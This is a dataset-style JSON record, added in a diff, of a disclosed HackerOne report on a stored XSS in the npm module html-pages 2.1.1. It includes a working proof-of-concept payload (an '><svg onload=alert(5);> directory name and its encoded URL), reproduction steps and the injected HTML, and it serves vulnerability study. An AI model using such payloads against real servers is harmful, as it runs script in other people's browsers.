@@ -1,0 +1,55 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "tungpun ",
+  "title": "[html-pages] Stored XSS in the filename when directories listing",
+  "content": "\nI would like to report a Store XSS vulnerability in html-pages\nIt allows executing malicious javascript code in the user's browser.\nModule\nmodule name: html-pages\nversion: 2.1.1\nnpm page: https://www.npmjs.com/package/html-pages\nModule Description\nSimple development http server for file serving and directory listing made by a Designer. Use it for hacking your HTML/JavaScript/CSS files, but not for deploying your final site.\nVulnerability\nSteps To Reproduce:\nInstall the module:\n$ npm install html-pages\nOn the working directory, create a new child directory with name: \"><svg onload=alert(5);>\nStart the server:\n$ ./node_modules/html-pages/bin/index.js -p 6060\nGo to http://127.0.0.1:6060/, then click on the directory \"><svg onload=alert(5);>\nor open http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/ directly, the XSS popup will fire:\n<image_0>\nVulnerability Description\nThis issue happens because of the lack of path sanitization.\nHTML output:\nCode 1.10 KiB\n1<!DOCTYPE html>\n2<html lang=\"en\">\n3  <head>\n4    <meta charset=\"utf-8\">\n5    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n6    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n7    <title>Files within nodejs-example/\"><svg onload=alert(5);></title>\n8    <meta name=\"description\" content=\"\">\n9    <link rel=\"stylesheet\" href=\"/@html-pages-internal-files-hoihj6ey0qu/css/style.css\">\n10    <link rel=\"stylesheet\" href=\"/@html-pages-internal-files-hoihj6ey0qu/css/component.css\">\n11    <link rel=\"stylesheet\" href=\"/@html-pages-internal-files-hoihj6ey0qu/css/loader.css\">\n12    <link rel=\"icon\" type=\"image/svg+xml\" href=\"/@html-pages-internal-files-hoihj6ey0qu/images/logo.svg\">\n13  </head>\n14\n15  <body>\n16    <header>\n17      <div class=\"wrapper\">\n18        <nav>\n19          <ol class=\"breadcrumb custom-separator\">\n20              <li class=\"\">\n21                <a class=\"background-effect\" href=\"/\">nodejs-example</a>\n22              </li>\n23              <li class=\"current\">\n24                <span>\"><svg onload=alert(5);></span>\n25              </li>\n26          </ol>\n27        </nav>\n28\n29[...]\n30\nSupporting Material/References:\nmacOS High Sierra 10.13.3\nnode v8.10.0\nnpm 5.6.0\nFirefox 59.0.2 (64-bit)\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt allows executing malicious javascript code in the user's browser\n\n",
+  "severity": [
+    7.3,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/119/22d7d4429a9375867518b85e8067345c092008c6/hp.png?response-content-disposition=attachment%3B%20filename%3D%22hp.png%22%3B%20filename%2A%3DUTF-8%27%27hp.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GU2M7YZ%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T165950Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDIYlR0t7EfYRa%2B15XNsA53ckYJeOxtlQXx05Sey1hUnwIhAK1hz7%2BFGyKFtKE%2F8GyKgS1qUeYCvod4l%2BfchsetUEtWKrIFCDIQAxoMMDEzNjE5Mjc0ODQ5Igzw54GGSEptQf6v9hwqjwXLKs0RM7aKkbyjL8InLMdu4DjLXX%2FsAu%2BlcPBm6o20QLDrvTOdHlsIBYMWBWCD4Th6osOPXbCgiG9wETg3UoF14UDrntIEXzyS52tEshZe4ttzb72486vIifi0oI%2FHnsbYRaj%2BR9C8j3LDwvGxIvJxHHBdiowbIQ0L7Glkx1ynAN5qdcLcdArJF6xNnCqHxn0A%2FMk3%2Boas6oHfuwew%2BubfuyujCnvYyY%2B8NQu0C1kQ3f8nkUWiG93Zi6muAmw0Iuu0frm2yvE8EVCQelomPpWzyYVCCP%2FOM5L1dWnAuJUiyvr5%2FTNJHBmPQVBr6yDzOxhvI%2FqPlCuIJRaTZDlJUd%2BenQAORMTRBlQqAFO8HwtfkF0w8dxivIrc74Ojxk7XN44NxA3zKERD9nXScfoABueYkB3LGBSnRksv6nrCssnXVKsM02O0JmEgZXFbFWJGl6lU4RsVkeuLlTENssv42vIbYbSIc1wJ4%2FUO%2FPcIZjPT0vfNc2o2dYmjyKfdBCx6rlC9mMlutT7rTEYg5YP%2F0maqcpRqQ9CRW4s0%2BYEATnu7ZVv8elLswaNMUQ8j7Yit8J7BEOjAfUjW%2BiwI6AC5rUmwNa718MDun4lP5a5hIdY%2Fc%2FCb0HVBveL73I1YwdUMEiIm%2BJrBs8JApyUAgpLqoxMrnsCrTp8%2FevdxkYcn2%2B%2BEBQg5cxE%2FiZVxCwml4rml1NBhoOI%2FZ9w3ALIYwllGShwYSeFvPyWOgpD5dG8rWZJLePnxI7mE4v6hC2OjETx068oH8qzzxDYctKOs3xb35HmX7%2Fh2myFytO8dHDsYjO8OMj4KgP37DGKru1IZQ3olENpZ1Rp8iXA%2FYJPiRKOpy9YRMpxTk7qhx21S2P3mZsPFMPHVkL8GOrABUv4iH%2Ffl4RlBDus1tIDq5ZlbGnf3lGQqoQ7MBGmHjtvl7gik21VW0n%2Fxs1n1HJVnF3NcPVBGBoVrE71UVzDNo78N5o28t0S6XDcpKh3KNU9EVHizWRX9C51z2a7PY3E6JYR1hX78JXulsRXWGLRE%2FsBd55D1rVYVH9umyFOdLU0CFmZHj2ILQ06flW0cVITaEjyX%2FsacXW964kBteGEbu8cl3pI%2B4s6xXmmgfyjPf%2F4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=009a750f85d588f5643d9a5dd1ad8ea9cfd1fe8147604be07ffa240c1a8175db"
+  },
+  "disclosed_date": 1528805040,
+  "report_url": "https://hackerone.com/reports/330356",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the module: $ npm install html-pages"
+    ],
+    [
+      2,
+      "Create a directory with a malicious name: '><svg onload=alert(5);>'"
+    ],
+    [
+      3,
+      "Start the server: $ ./node_modules/html-pages/bin/index.js -p 6060"
+    ],
+    [
+      4,
+      "Access the directory via browser: http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Stored Cross-Site Scripting (XSS) in the html-pages module, where malicious JavaScript code can be executed in the user's browser by creating a directory with a specially crafted name. The lack of path sanitization allows the script to be injected into the HTML output, specifically in the title and breadcrumb sections of the directory listing page.",
+  "reason": "The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability arises from a basic lack of input sanitization, a common issue in web applications. The steps to reproduce are simple and do not require any advanced knowledge or manipulation of application states.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability in html-pages is not related to authentication or authorization (AuthN/AuthZ) issues. It's a stored XSS vulnerability that occurs due to lack of input sanitization in filenames when displaying directory listings. The proposed methodologies focus on testing authorization boundaries between different user sessions and resources, which doesn't apply to this XSS vulnerability.",
+    "is_detectable": false
+  }
+}
